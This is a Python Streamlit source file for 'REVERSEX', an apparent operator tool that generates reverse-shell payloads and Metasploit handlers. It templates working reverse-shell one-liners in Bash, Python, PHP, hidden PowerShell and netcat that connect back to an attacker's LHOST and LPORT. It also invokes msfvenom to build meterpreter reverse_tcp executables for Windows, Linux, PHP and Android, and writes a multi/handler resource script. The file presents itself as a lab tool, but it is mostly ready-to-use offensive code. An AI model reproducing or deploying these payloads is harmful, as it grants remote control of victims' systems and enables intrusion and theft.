
from datetime import datetime
import os
import re
import subprocess
import streamlit as st

# Page Configuration
st.set_page_config(
    page_title="REVERSEX",
    page_icon="🛡️",
    layout="wide",
)

# Custom Cyberpunk Styling & Top Margin Reduction
st.markdown(
    """
    <style>
    .main {
        background-color: #0e1117;
    }
    /* Reduce top padding of the main container to shift title up */
    .block-container {
        padding-top: 1.5rem !important;
    }
    /* Reduce top padding of the sidebar to shift LAB CONTROLS up */
    [data-testid="stSidebar"] > div:first-child {
        padding-top: 1.5rem !important;
    }
    .stMetric {
        background-color: #1a1c24;
        padding: 15px;
        border-radius: 10px;
        border: 1px solid #30363d;
    }
    </style>
""",
    unsafe_allow_html=True,
)


def validate_ip(ip):
    pattern = r"^([0-9]{1,3}\.){3}[0-9]{1,3}$"
    return bool(re.match(pattern, ip))


# --- SIDEBAR GUI ---
st.sidebar.markdown("## 🛡️ CONNECTION SETTING")
st.sidebar.markdown("---")

lhost = st.sidebar.text_input("Local IP (LHOST)", "192.168.1.56")
lport = st.sidebar.number_input(
    "Local Port (LPORT)", min_value=1024, max_value=65535, value=8888
)

st.sidebar.markdown("---")
st.sidebar.success(
    "💡 **System Status:** Online\n\nConfigure your listener settings above to build payloads."
)

# --- MAIN TITLE & METRICS OVERVIEW ---
st.title("🛡️ REVERSEX")
st.markdown(
    "Advanced graphical operator suite for payload generation and handler automation."
)

# Top Metrics Row
col_m1, col_m2, col_m3, col_m4 = st.columns(4)
with col_m1:
    st.metric(label="Target Architecture", value="Multi-OS", delta="Supported")
with col_m2:
    st.metric(label="Listener Port", value=lport, delta="Ephemeral / TCP")
with col_m3:
    st.metric(label="Active Interface", value=lhost, delta="Secure Lab")
with col_m4:
    st.metric(label="Framework", value="Metasploit & Netcat", delta="Ready")

st.markdown("---")

# --- MAIN PAYLOAD GENERATOR SECTION ---
st.subheader("Interactive Payload & Handler Factory")

col_cfg1, col_cfg2 = st.columns([1, 2])

with col_cfg1:
    payload_category = st.selectbox(
        "Select Generator Engine",
        [
            "Standard One-Liners (Bash, Python, PHP, PowerShell, Netcat)",
            "Metasploit Framework (msfvenom)",
        ],
    )

if payload_category == "Standard One-Liners (Bash, Python, PHP, PowerShell, Netcat)":
    payload_type = st.selectbox(
        "Select Payload Language",
        ["Bash (TCP)", "Python 3", "PHP", "PowerShell", "Netcat"],
    )

    if payload_type == "Bash (TCP)":
        payload = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    elif payload_type == "Python 3":
        payload = f'python3 -c \'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("{lhost}",{lport})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); import pty; pty.spawn("/bin/bash")\''
    elif payload_type == "PHP":
        payload = (
            f'php -r \'$sock=fsockopen("{lhost}",{lport});'
            ' exec("/bin/sh -i <&3 >&3 2>&3");\''
        )
    elif payload_type == "PowerShell":
        payload = (
            "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object"
            f' System.Net.Sockets.TCPClient("{lhost}",{lport});$stream ='
            " $client.GetStream();[byte[]]$bytes ="
            " 0..65535|%{0};while(($i = $stream.Read($bytes, 0,"
            " $bytes.Length)) -ne 0){;$data = (New-Object -TypeName"
            " System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback ="
            ' (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS "'
            " + (pwd).Path + \"> \";$sendbyte ="
            " ([text.encoding]::ascii).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
        )
    else:
        payload = f"nc {lhost} {lport} -e /bin/bash"

    st.markdown("##### 📝 Generated Connection String")
    st.code(payload, language="bash")

    if st.button("💾 Save Payload to file", type="primary"):
        with open("payload.txt", "w") as f:
            f.write(payload)
        st.success("Payload successfully saved to payload.txt!")

else:
    platform_choice = st.selectbox(
        "Select Target Platform & Format",
        [
            "Windows x64 Executable (.exe)",
            "Linux x64 ELF Binary (.elf)",
            "PHP Script (.php)",
            "Android APK (.apk)",
        ],
    )

    msf_map = {
        "Windows x64 Executable (.exe)": (
            "windows/x64/meterpreter/reverse_tcp",
            "exe",
            "exe",
        ),
        "Linux x64 ELF Binary (.elf)": (
            "linux/x64/meterpreter/reverse_tcp",
            "elf",
            "elf",
        ),
        "PHP Script (.php)": ("php/meterpreter/reverse_tcp", "php", "raw"),
        "Android APK (.apk)": ("android/meterpreter/reverse_tcp", "apk", "raw"),
    }

    msf_payload, ext, fmt = msf_map[platform_choice]
    filename = f"payload.{ext}"
    rc_file = "handler.rc"

    st.markdown("##### 💻 Msfvenom Command Preview")
    st.code(
        f"msfvenom -p {msf_payload} LHOST={lhost} LPORT={lport} -f {fmt} -o {filename}",
        language="bash",
    )

    if st.button("🚀 Build Payload & Handler Script", type="primary"):
        with st.spinner("Compiling binary and generating resource handler..."):
            res = subprocess.run(
                [
                    "msfvenom",
                    "-p",
                    msf_payload,
                    f"LHOST={lhost}",
                    f"LPORT={lport}",
                    "-f",
                    fmt,
                    "-o",
                    filename,
                ],
                capture_output=True,
                text=True,
            )

            if res.returncode == 0:
                st.success(f"Successfully compiled and generated: {filename}!")

                with open(rc_file, "w") as f:
                    f.write(
                        f"use exploit/multi/handler\nset PAYLOAD"
                        f" {msf_payload}\nset LHOST {lhost}\nset LPORT"
                        f" {lport}\nexploit\n"
                    )

                st.info(
                    f"Metasploit resource script generated: `{rc_file}`.\n\nTo"
                    f" catch connection, run: `msfconsole -r {rc_file}`"
                )
            else:
                st.error("Failed to generate payload via msfvenom.")
                st.text(res.stderr)
